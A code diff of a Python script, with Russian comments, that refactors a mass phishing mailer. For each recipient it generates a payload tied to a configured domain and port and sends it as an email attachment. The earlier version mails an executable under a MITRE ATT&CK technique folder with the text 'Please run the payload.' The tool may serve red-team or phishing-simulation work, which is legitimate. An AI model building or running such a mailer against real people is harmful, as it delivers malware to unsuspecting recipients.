@@ -4,60 +4,56 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import os
-from generator import generate_payload
-from load_configs import parse_sender, parse_recipients
+from generator import generate_payloads
+from log import log
 
-def send_email(sender, password, receiver, subject, message, attachments=None):
+def load_attachment(msg, attachment_path):
+    with open(attachment_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
 
-    msg = MIMEMultipart()  # Используем MIMEMultipart для поддержки вложений
-    msg['From'] = sender
-    msg['To'] = receiver
-    msg['Subject'] = subject  # Установка темы письма
+    encoders.encode_base64(part)
+    part.add_header(
+        "Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}"
+    )
+    msg.attach(part)
 
-    msg.attach(MIMEText(message, 'plain')) # Добавляем текстовое сообщение
+# Функция для отправки email
+def send_email_with_attachment(configs, recipient, target_content, attachment_path):
+    # Создаем письмо
+    msg = MIMEMultipart()
+    msg["From"] = configs["SMTP_USER"]
+    msg["To"] = recipient.email
+    msg["Subject"] = target_content.subject
 
-    if attachments:
-        for attachment in attachments:
-            try:
-                with open(attachment, "rb") as f:
-                    part = MIMEBase("application", "octet-stream")
-                    part.set_payload(f.read())
-                    encoders.encode_base64(part)
-                    filename = os.path.basename(attachment) # Извлекаем имя файла
-                    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
-                    msg.attach(part)
-            except FileNotFoundError:
-                print(f"Файл {attachment} не найден.")
-                return
-            except Exception as e:
-                print(f"Ошибка при добавлении вложения {attachment}: {e}")
-                return
-    print("Подключение к серверу...")
+    body = target_content.message
+    msg.attach(MIMEText(body, "plain"))
+
+    load_attachment(msg, attachment_path)
+    log(f"Attach loaded to email.", "INFO")
+    log(f"Connecting to SMTP-server ...", "INFO")
+    # Отправка письма через SMTP_SSL
     try:
-        with smtplib.SMTP_SSL('smtp.timeweb.ru', 465) as smtp:
-            print("Попытка логина")
-            smtp.login(sender, password)
-            smtp.send_message(msg)
-        print("Письмо успешно отправлено")
-    except smtplib.SMTPAuthenticationError:
-        print("Ошибка аутентификации SMTP. Проверьте логин и пароль.")
-    except smtplib.SMTPException as e:
-        print(f"Ошибка SMTP: {e}")
+        with smtplib.SMTP_SSL(configs["SMTP_SERVER"], configs["SMTP_PORT"]) as server:
+            log(f"Connected to SMTP-server.", "INFO")
+            log(f"Authentication...", "INFO")
+            server.login(configs["SMTP_USER"], configs["SMTP_PASSWORD"])
+            log(f"Authentication success.", "INFO")
+            server.send_message(msg)
+        log(f"Email sent to {recipient.email}", "INFO")
     except Exception as e:
-        print(f"Общая ошибка отправки письма: {e}")
+        log(f"Someting went wrong for {recipient.email}", "ERROR")
 
 
-sender_email, sender_password = parse_sender("sender.txt")
-recipients = parse_recipients("recipients.txt")
-subject = "Test Email with Payload Hello World"
-message = "Hello, this is a test email with payload. Please run the payload."
-attachments=[ "../T1027.003/test.exe"]
-def main():
-    if sender_email and sender_password and recipients:
-        for receiver_email in recipients:
-            send_email(sender_email, sender_password, receiver_email, subject, message, attachments)
-    else:
-        print("Failed to load sender or recipient data. Exiting.")
+# Логика для массовой рассылки
+def mass_email_dispatch(configs, target_content, target_payload, recipients):
+    for recipient in recipients:
+        log(f"Generating payload for {recipient.email}...", "INFO")
+        print("\n")
+        generate_payloads(configs["DOMAIN_NAME"], configs["PORT"], recipient, target_payload)
 
-if __name__ == "__main__":
-    main()
+        log(f"Sending mail for {recipient.email}.", "INFO")
+
+        send_email_with_attachment(configs, recipient, target_content, target_payload.attachment_path)
+
+
